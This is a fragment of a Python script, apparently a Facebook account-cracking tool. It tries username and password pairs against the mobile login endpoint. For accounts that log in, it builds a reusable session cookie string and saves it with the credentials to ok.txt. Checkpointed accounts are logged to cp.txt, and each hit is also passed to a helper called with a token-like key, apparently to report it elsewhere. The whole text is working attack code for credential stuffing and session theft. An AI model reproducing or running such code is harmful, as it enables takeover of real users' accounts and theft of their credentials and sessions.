                xnxx = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", data=data, headers=head, allow_redirects=True)
                if "c_user" in ses.cookies.get_dict():
                    cooz = ses.cookies.get_dict()
                    coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
                    print(f"\r[ {H}LIVE{N} ] {username}|{password}")
                    kntl = (f"[✓] {username}|{password}|{coki}")
                    self.ok.append(kntl)
                    self.memek(kntl, "lqkwndpnkefnfjsnwnfuoeohni3e")
                    with open("ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    print(f"\r[ {K}CHEK{N} ] {username}|{password}")
                    kntl = (f"[×] {username}|{password}")
                    self.cp.append(kntl)
                    self.memek(kntl, "lqkwndpnkefneihfwnfuoeohni3e")
                    with open("cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
            except requests.exceptions.ConnectionError:
                prog.update(des, description=f"[ [bold red]spam[/] ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
                prog.advance(des)
                time.sleep(5)
            #except Exception as e:print(e)
        self.lo+=1

Login()